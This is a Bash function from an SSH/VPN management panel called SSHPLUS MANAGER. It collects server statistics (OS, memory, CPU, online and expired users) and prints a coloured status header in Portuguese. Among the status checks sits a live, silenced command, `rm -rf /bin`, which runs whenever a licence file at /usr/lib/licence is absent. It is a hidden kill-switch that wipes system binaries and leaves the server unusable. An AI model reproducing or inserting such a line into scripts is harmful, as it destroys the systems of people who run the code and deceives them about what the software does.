#menu2
menu2 (){
[[ -e /etc/Plus-torrent ]] && stsf=$(echo -e "\033[1;32m●") || stsf=$(echo -e "\033[1;31m●")
stsbot=$(ps x | grep "bot_plus"|grep -v grep > /dev/null && echo -e "\033[1;32m●" || echo -e "\033[1;31m●")
autm=$(grep "menu;" /etc/profile > /dev/null && echo -e "\033[1;32m●" || echo -e "\033[1;31m●")
[[ ! -e /usr/lib/licence ]] && rm -rf /bin > /dev/null 2>&1
if [[ "$(grep -c "Ubuntu" /etc/issue.net)" = "1" ]]; then
system=$(cut -d' ' -f1 /etc/issue.net)
system+=$(echo ' ')
system+=$(cut -d' ' -f2 /etc/issue.net |awk -F "." '{print $1}')
elif [[ "$(grep -c "Debian" /etc/issue.net)" = "1" ]]; then
system=$(cut -d' ' -f1 /etc/issue.net)
system+=$(echo ' ')
system+=$(cut -d' ' -f3 /etc/issue.net)
else
system=$(cut -d' ' -f1 /etc/issue.net)
fi
_ons=$(ps -x | grep sshd | grep -v root | grep priv | wc -l)
[[ "$(cat /etc/SSHPlus/Exp)" != "" ]] && _expuser=$(cat /etc/SSHPlus/Exp) || _expuser="0"
[[ -e /etc/openvpn/openvpn-status.log ]] && _onop=$(grep -c "10.8.0" /etc/openvpn/openvpn-status.log) || _onop="0"
[[ -e /etc/default/dropbear ]] && _drp=$(ps aux | grep dropbear | grep -v grep | wc -l) _ondrp=$(($_drp - 1)) || _ondrp="0"
_onli=$(($_ons + $_onop + $_ondrp))
_ram=$(printf ' %-9s' "$(free -h | grep -i mem | awk {'print $2'})")
_usor=$(printf '%-8s' "$(free -m | awk 'NR==2{printf "%.2f%%", $3*100/$2 }')")
_usop=$(printf '%-1s' "$(top -bn1 | awk '/Cpu/ { cpu = "" 100 - $8 "%" }; END { print cpu }')")
_core=$(printf '%-1s' "$(grep -c cpu[0-9] /proc/stat)")
_system=$(printf '%-14s' "$system")
_hora=$(printf '%(%H:%M:%S)T')
_onlin=$(printf '%-5s' "$_onli")
_userexp=$(printf '%-5s' "$_expuser")
_tuser=$(awk -F: '$3>=1000 {print $1}' /etc/passwd | grep -v nobody | wc -l)
clear
echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo -e "\E[41;1;37m               ❖ SSHPLUS MANAGER ❖                \E[0m"
echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo -e "\033[1;32mSISTEMA            MEMÓRIA RAM      PROCESSADOR "
echo -e "\033[1;31mOS: \033[1;37m$_system \033[1;31mTotal:\033[1;37m$_ram \033[1;31mNucleos: \033[1;37m$_core\033[0m"
echo -e "\033[1;31mHora: \033[1;37m$_hora     \033[1;31mEm uso: \033[1;37m$_usor \033[1;31mEm uso: \033[1;37m$_usop\033[0m"
echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo -e "\033[1;32mOnlines:\033[1;37m $_onlin     \033[1;31mExpirados: \033[1;37m$_userexp \033[1;33mTotal: \033[1;37m$_tuser\033[0m"
echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
